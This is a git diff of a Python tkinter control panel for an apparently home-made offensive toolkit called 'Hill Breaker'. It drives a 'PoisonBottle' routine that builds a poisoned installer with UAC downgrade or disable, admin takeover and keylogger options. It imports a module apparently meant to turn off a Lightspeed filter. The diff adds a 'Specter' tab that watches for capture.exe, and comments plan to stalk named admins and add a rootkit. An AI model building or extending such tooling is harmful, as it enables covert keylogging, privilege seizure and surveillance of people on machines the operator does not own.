@@ -2,7 +2,7 @@
 import tkinter
 from tkinter import *
 from tkinter import ttk, filedialog #.ttk and tkinter widgets are diffrent, headache
-import Jacker, LightspeedOff
+import Jacker, LightspeedOff, Spectator
 from ctypes import windll
 from sys import executable, argv
 from os import getlogin
@@ -31,6 +31,10 @@ class Methods():
     def Create():
         Jacker.PoisonBottle(Methods.installer, includeUACdowngrade.get(), includeUACdisable.get(), includePWNadmin.get(), includeKeylog.get())
 
+    #Launch thread that will look for capture.exe to launch and send notification
+    def Watcher():
+        Spectator.Watcher()
+        
 #Hill Breaker
 
 root = tkinter.Tk()
@@ -42,10 +46,12 @@ tab = ttk.Notebook(root)
 home = Frame(tab,padx=10,pady=10,bg='#999999')
 hijacking = Frame(tab,padx=10,pady=10,bg='#999999')
 controls = Frame(tab,padx=10,pady=10,bg='#999999')
+specter = Frame(tab,padx=10,pady=10,bg='#999999')
 
 tab.add(home, text='Home')
 tab.add(hijacking, text='Hijacking')
 tab.add(controls, text='Controls')
+tab.add(specter, text='Specter')
 
 tab.pack(expand=1, fill='both')
 
@@ -98,6 +104,11 @@ create.pack(anchor='nw')
 #Controller - Control local system, disable UAC, etc. from a pivot
 
 #Stalker - "stalk" admins and admin logs, i.e "tdoyle has logged in at __" "cevans has done __"
+monitor = LabelFrame(specter, text="Monitoring Options",padx=10,pady=10,bg='#888888',borderwidth=5)
+captureWatch = Button(monitor, text="Launch capture.exe Watcher", command=lambda : Methods.Watcher())
+
+monitor.pack(anchor='nw')
+captureWatch.pack(anchor='nw')
 
 #Roots - Rootkit when?
 
